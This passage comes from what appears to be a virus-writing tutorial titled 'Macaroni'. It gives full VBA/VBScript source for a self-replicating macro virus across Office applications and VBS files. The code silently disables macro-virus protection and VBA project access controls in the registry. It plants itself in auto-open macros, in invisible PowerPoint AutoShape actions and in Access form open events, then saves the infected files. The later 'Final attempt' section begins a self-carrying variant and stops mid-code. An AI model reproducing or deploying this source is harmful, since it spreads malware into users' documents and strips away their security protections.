</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;n.docmd.openform n.currentproject.allforms(0).name,1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; n.forms(0).onopen=<span style="color: #800000;">&quot;=&quot;</span>+p+<span style="color: #800000;">&quot;()&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; n.docmd.save 5,f<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; n.activedocument.save<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; n.activeworkbook.save<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; n.filesave<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; n.fileclose<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e&lt;&gt;2and e&lt;&gt;4then n.quit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'PowerPoint and Project are single-instance<br/>
</span> &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
<span style="color: #8D38C9; font-weight: bold;">next</span><br/>
h.slideshowwindow.view.<span style="color: #8D38C9; font-weight: bold;">next</span><span style="color: black; font-style: italic;">'' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'move to next PowerPoint slide, double quote to mark end of code<br/>
</span></div>
<p>So we cover Word, Excel, PowerPoint, Access, Project, Visio in ~130 lines. What's next?</p>
<h2><a name="c4"></a>Second attempt</h2>
<p>If you are familiar with VBScript, you might notice something special about the code above - is it VBA or VBS? Actually, it is written in such a way that it is identical. The next step should be obvious - infect VBS files, too.</p>
<p>This is achieved very simply. Firstly, we add "vbs" to our extension array. Next, we get our filename if we are in VBS mode. We no longer delete the file, since it is not temporary anymore. Finally, for each VBS file that we find, we search within it for our infection marker, then add ourselves if it is not found. That produces this code:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">'Macaroni - roy g biv 05/02/05<br/>
</span>a=array(<span style="color: #800000;">&quot;doc&quot;</span>,<span style="color: #800000;">&quot;xls&quot;</span>,<span style="color: #800000;">&quot;ppt&quot;</span>,<span style="color: #800000;">&quot;mdb&quot;</span>,<span style="color: #800000;">&quot;mpp&quot;</span>,<span style="color: #800000;">&quot;vsd&quot;</span>,<span style="color: #800000;">&quot;vbs&quot;</span>)<br/>
b=array(<span style="color: #800000;">&quot;Word&quot;</span>,<span style="color: #800000;">&quot;Excel&quot;</span>,<span style="color: #800000;">&quot;PowerPoint&quot;</span>,<span style="color: #800000;">&quot;Access&quot;</span>,<span style="color: #800000;">&quot;Project&quot;</span>,<span style="color: #800000;">&quot;Visio&quot;</span>)<br/>
c=array(<span style="color: #800000;">&quot;Document&quot;</span>,<span style="color: #800000;">&quot;WorkBook&quot;</span>,<span style="color: #800000;">&quot;p&quot;</span>,<span style="color: #800000;">&quot;d&quot;</span>,b(4),<span style="color: #800000;">&quot;Document&quot;</span>,<span style="color: #800000;">&quot;Macaroni&quot;</span>)<br/>
y=<span style="color: #800000;">&quot;byval z as &quot;</span><br/>
<span style="color: #151B8D; font-weight: bold;">dim</span> d(6)<br/>
d(4)=y+b(4)<br/>
d(5)=y+<span style="color: #800000;">&quot;iv&quot;</span>+c(0)<br/>
e = 6 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'spaces must be here because VBA will insert them anyway, begin in VBS mode<br/>
</span>f=<span style="color: #800000;">&quot;This&quot;</span>+c(e)<br/>
g=<span style="color: #800000;">&quot;m&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'our export filename<br/>
</span><span style="color: #151B8D; font-weight: bold;">on</span> <span style="color: #151B8D; font-weight: bold;">error</span> <span style="color: #151B8D; font-weight: bold;">resume</span> <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
vbe.activevbproject.vbcomponents(f).export(g) &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'Access only<br/>
</span><span style="color: #151B8D; font-weight: bold;">set</span> h=activedocument<br/>
<span style="color: #151B8D; font-weight: bold;">set</span> h=activeworkbook<br/>
<span style="color: #151B8D; font-weight: bold;">set</span> h=activeproject<br/>
<span style="color: #151B8D; font-weight: bold;">set</span> h=activepresentation<br/>
h.vbproject.vbcomponents(f).export(g) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'everything else<br/>
</span><span style="color: #8D38C9; font-weight: bold;">if</span> e=6then g=wscript.scriptfullname<br/>
i=<span style="color: #800000;">&quot;'&quot;</span>+c(6)<br/>
<span style="color: #151B8D; font-weight: bold;">set</span> j=<span style="color: #E56717; font-weight: bold;">createobject</span>(<span style="color: #800000;">&quot;scripting.filesystemobject&quot;</span>)<br/>
k=j.opentextfile(g).readall<br/>
k=mid(k,instr(k,i)) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'remove everything before our code<br/>
</span>k=left(k,instr(k,<span style="color: #800000;">&quot;'&quot;</span>+<span style="color: #800000;">&quot;'&quot;</span>)+1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'remove everything after our code<br/>
</span><span style="color: #8D38C9; font-weight: bold;">if</span> e&lt;&gt;6then j.getfile(g).delete &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'clean up if not in VBS file<br/>
</span>randomize<br/>
e=int(rnd*7)<br/>
f=<span style="color: #800000;">&quot;This&quot;</span>+c(e)<br/>
g=instr(k,<span style="color: #800000;">&quot;e = &quot;</span>)<br/>
l=vbcrlf<br/>
g=l+left(k,g+3)+cstr(e)+mid(k,g+5)+l+<span style="color: #800000;">&quot;end &quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'save container type for next time<br/>
</span><span style="color: #151B8D; font-weight: bold;">set</span> k=<span style="color: #E56717; font-weight: bold;">createobject</span>(<span style="color: #800000;">&quot;wscript.shell&quot;</span>)<br/>
m=<span style="color: #800000;">&quot;HKCU\software\microsoft\&quot;</span><br/>
n=m+<span style="color: #800000;">&quot;office\8.0\&quot;</span><br/>
o=<span style="color: #800000;">&quot;REG_SZ&quot;</span><br/>
k.regwrite n+<span style="color: #800000;">&quot;Word\Options\EnableMacroVirusProtection&quot;</span>,0,o<br/>
k.regwrite n+<span style="color: #800000;">&quot;MS Project\Options\General\Macro Virus Protection&quot;</span>,<span style="color: #800000;">&quot;No&quot;</span>,o<br/>
o=<span style="color: #800000;">&quot;REG_DWORD&quot;</span><br/>
k.regwrite n+<span style="color: #800000;">&quot;Excel\Microsoft Excel\Options6&quot;</span>,0,o<br/>
k.regwrite n+<span style="color: #800000;">&quot;PowerPoint\Options\MacroVirusProtection&quot;</span>,0,o<br/>
n=b(e)<br/>
<span style="color: #8D38C9; font-weight: bold;">if</span> e=4then n=<span style="color: #800000;">&quot;MS &quot;</span>+n<br/>
<span style="color: #8D38C9; font-weight: bold;">if</span> e&lt;&gt;6then<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">for</span> p=9to 12<br/>
&nbsp; &nbsp; q=m<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e&lt;&gt;5then q=q+<span style="color: #800000;">&quot;Office\&quot;</span>+cstr(p)+<span style="color: #800000;">&quot;.0\&quot;</span><br/>
&nbsp; &nbsp; q=q+n+<span style="color: #800000;">&quot;\Security\&quot;</span><br/>
&nbsp; &nbsp; k.regwrite q+<span style="color: #800000;">&quot;Level&quot;</span>,1,o<br/>
&nbsp; &nbsp; k.regwrite q+<span style="color: #800000;">&quot;AccessVBOM&quot;</span>,1,o<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
<span style="color: #151B8D; font-weight: bold;">set</span> k=j.getfolder(<span style="color: #800000;">&quot;.&quot;</span>) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'demo version, current directory only<br/>
</span><span style="color: #8D38C9; font-weight: bold;">for</span> <span style="color: #8D38C9; font-weight: bold;">each</span> m <span style="color: #8D38C9; font-weight: bold;">in</span> k.files<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> lcase(j.getextensionname(m))=a(e)<span style="color: #8D38C9; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; m=m.path<br/>
&nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=j.opentextfile(m,8)<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
&nbsp; &nbsp; &nbsp; p=<span style="color: #800000;">&quot;sub &quot;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=6then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> instr(j.opentextfile(m).readall,i)=0then o.write l+c(6)+l+p+c(6)+g+p<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'infect VBS if not infected already (infection marker is first comment)<br/>
</span> &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=5then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=<span style="color: #E56717; font-weight: bold;">createobject</span>(n+<span style="color: #800000;">&quot;.invisibleapp&quot;</span>)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=4then n=<span style="color: #800000;">&quot;MS&quot;</span>+b(e)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> o=<span style="color: #E56717; font-weight: bold;">createobject</span>(n+<span style="color: #800000;">&quot;.application&quot;</span>)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.visible=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.application.automationsecurity=1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> q=o.documents<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> q=o.workbooks<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> q=o.presentations<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=3then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.opencurrentdatabase(m)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=4then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.fileopen(m)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> q=o.activeproject<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=2then o.visible=1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'PowerPoint window is not allowed to be hidden<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #151B8D; font-weight: bold;">set</span> q=q.<span style="color: #151B8D; font-weight: bold;">open</span>(m)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> m=o.vbe.activevbproject.vbcomponents(f).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> m=q.vbproject.vbcomponents(f).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; r=<span style="color: #800000;">&quot;_open&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=5then r=<span style="color: #800000;">&quot;_&quot;</span>+c(0)+<span style="color: #800000;">&quot;opened&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; r=c(e)+r<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; err=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m=m.proccountlines(q,0) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'Office infection marker is presence of code in module of our name<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">if</span> err.number&gt;0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=2then q.vbproject.vbcomponents.add(1).name=f<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'PowerPoint does not contain any This* module by default<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">if</span> e=3then &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'Access does not contain any This* module by default<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">with</span> o.vbe.activevbproject<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .vbcomponents.add(1).name=f<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> m=.vbcomponents(f).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> m=q.vbproject.vbcomponents(f).codemodule<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q=<span style="color: #800000;">&quot;private &quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=2or e=3then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; q=<span style="color: #800000;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=3then p=<span style="color: #800000;">&quot;function &quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m.addfromstring(q+p+r+<span style="color: #800000;">&quot;(&quot;</span>+d(e)+<span style="color: #800000;">&quot;)&quot;</span>+g+p)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'all but PowerPoint and Access activation is auto-macro<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">with</span> o.activepresentation &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'PowerPoint activation is via AutoShape click action<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">with</span> .slidemaster<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> m=.shapes.addshape(1,0,0,.width,.height)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; m.fill.transparency=1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">with</span> m.actionsettings(1)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .action=8<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .run=r<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .save<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .<span style="color: #8D38C9; font-weight: bold;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">with</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e=3then &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'Access activation is via form open<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;o.docmd.openform o.currentproject.allforms(0).name,1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.forms(0).onopen=<span style="color: #800000;">&quot;=&quot;</span>+r+<span style="color: #800000;">&quot;()&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.docmd.save 5,f<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.activedocument.save<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.activeworkbook.save<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.filesave<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; o.fileclose<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> e&lt;&gt;2and e&lt;&gt;4then o.quit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'PowerPoint and Project are single-instance<br/>
</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
<span style="color: #8D38C9; font-weight: bold;">next</span><br/>
h.slideshowwindow.view.<span style="color: #8D38C9; font-weight: bold;">next</span><span style="color: black; font-style: italic;">'' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'move to next PowerPoint slide, double quote to mark end of code<br/>
</span></div>
<h2><a name="c5"></a>Final attempt</h2>
<p>We can avoid the VBOM problem in macro code by simply carrying our own source. The maximum line length in VBA is 1024 characters, but we can extend that by using the line-continuation character ('_'), and we must not forget that we need to reserve some more characters for the '"', spaces, and '+'.</p>
<p>This also allows us to switch languages underneath, since we no longer need the VBx compatibility that we required earlier. First is VBScript version.</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">sig=<span style="color: #800000;">&quot;Macaroni - roy g biv 05/02/05&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'can no longer contain comments<br/>
</span>a=array(<span style="color: #800000;">&quot;doc&quot;</span>,<span style="color: #800000;">&quot;xls&quot;</span>,<span style="color: #800000;">&quot;ppt&quot;</span>,<span style="color: #800000;">&quot;mdb&quot;</span>,<span style="color: #800000;">&quot;mpp&quot;</span>,<span style="color: #800000;">&quot;vsd&quot;</span>,<span style="color: #800000;">&quot;vbs&quot;</span>)<br/>
b=array(<span style="color: #800000;">&quot;Word&quot;</span>,<span style="color: #800000;">&quot;Excel&quot;</span>,<span style="color: #800000;">&quot;PowerPoint&quot;</span>,<span style="color: #800000;">&quot;Access&quot;</span>,<span style="color: #800000;">&quot;Project&quot;</span>,<span style="color: #800000;">&quot;Visio&quot;</span>)<br/>
c=array(<span style="color: #800000;">&quot;Document&quot;</span>,<span style="color: #800000;">&quot;WorkBook&quot;</span>,<span style="color: #800000;">&quot;p&quot;</span>,<span style="color: #800000;">&quot;d&quot;</span>,b(4),<span style="color: #800000;">&quot;Document&quot;</span>,<span style="color: #800000;">&quot;Macaroni&quot;</span>)<br/>
y=<span style="color: #800000;">&quot;byval z as &quot;</span><br/>
<span style="color: #151B8D; font-weight: bold;">dim</span> d(6)<br/>
d(4)=y+b(4)<br/>
d(5)=y+<span style="color: #800000;">&quot;iv&quot;</span>+c(0)<br/>
<span style="color: #151B8D; font-weight: bold;">on</span> <span style="color: #151B8D; font-weight: bold;">error</span> <span style="color: #151B8D; font-weight: bold;">resume</span> <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
e=<span style="color: #800000;">&quot;sig=&quot;</span><br/>
<span style="color: #151B8D; font-weight: bold;">set</span> f=<span style="color: #E56717; font-weight: bold;">createobject</span>(<span style="color: #800000;">&quot;scripting.filesystemobject&quot;</span>)<br/>
g=f.opentextfile(wscript.scriptfullname).readall<br/>
g=mid(g,instr(g,e))<br/>
g=left(g,instr(g,<span style="color: #800000;">&quot;'&quot;</span>+<span style="color: #800000;">&quot;'&quot;</span>)+1)<br/>
randomize<br/>
h=int(rnd*7)<br/>
i=<span style="color: #800000;">&quot;This&quot;</span>+c(h)<br/>
j=chr(34)<br/>
k=j+<span style="color: #800000;">&quot;m.vbs&quot;</span>+j &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'our export filename<br/>
</span>l=vbcrlf<br/>
m=l+<span style="color: #800000;">&quot;open &quot;</span>+k+<span style="color: #800000;">&quot; for output as #1: a = chr(34): b = vbcrlf: c = &quot;</span>+j+replace(g,j,j+<span style="color: #800000;">&quot; + a + &quot;</span>+j)+j+l<br/>
n=1<br/>
<span style="color: #8D38C9; font-weight: bold;">do</span><br/>
&nbsp; o=1017<br/>
&nbsp; p=mid(m,n,o)<br/>
&nbsp; q=0<br/>
&nbsp; r=1<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">do</span><br/>
&nbsp; &nbsp; q=q+1<br/>
&nbsp; &nbsp; r=instr(r,p,j)+1<br/>
&nbsp; <span style="color: #8D38C9; font-weight: bold;">loop</span> <span style="color: #8D38C9; font-weight: bold;">while</span> r&gt;1<br/>
&nbsp; r=<span style="color: #800000;">&quot;&quot;</span><br/>
&nbsp; q=q <span style="color: #151B8D; font-weight: bold;">mod</span> 2<br/>
